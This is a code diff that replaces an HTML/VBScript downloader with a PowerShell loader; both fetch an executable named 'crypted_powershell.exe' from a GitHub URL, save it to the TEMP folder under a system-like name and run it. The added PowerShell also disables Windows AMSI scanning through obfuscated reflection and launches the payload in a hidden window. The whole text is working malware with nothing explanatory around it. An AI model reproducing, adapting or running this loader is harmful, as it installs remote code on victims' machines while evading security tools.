@@ -1,23 +1,10 @@
-<html><head>
-<script language="VBScript">
-Dim sUrl, sPath, oHTTP, oStream, oWMI, oPID
-sUrl  = "https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe"
-sPath = Environ("TEMP") & "\svchost32.exe"
+$t=[Ref].Assembly.GetType([string]::Join('',('Sy','stem','.','Man','age','ment','.','Auto','mat','ion','.','Am','si','Ut','ils')))
+$f=$t.GetField([string]::Join('',('am','si','Init','Fai','led')),[Reflection.BindingFlags]'NonPublic,Static')
+$f.SetValue($null,$true)
 
-Set oHTTP = CreateObject("MSXML2.XMLHTTP")
-oHTTP.Open "GET", sUrl, False
-oHTTP.Send
-
-Set oStream = CreateObject("ADODB.Stream")
-oStream.Type = 1
-oStream.Open
-oStream.Write oHTTP.ResponseBody
-oStream.SaveToFile sPath, 2
-oStream.Close
-
-Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2:Win32_Process")
-oWMI.Create sPath, Null, Null, oPID
-
-window.close
-</script>
-</head><body></body></html>
+$u='https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe'
+$p="$env:TEMP\svc32.exe"
+[System.Net.WebClient]::new().DownloadFile($u,$p)
+$si=[System.Diagnostics.ProcessStartInfo]::new()
+$si.FileName=$p;$si.WindowStyle='Hidden';$si.UseShellExecute=$false
+[System.Diagnostics.Process]::Start($si)|Out-Null
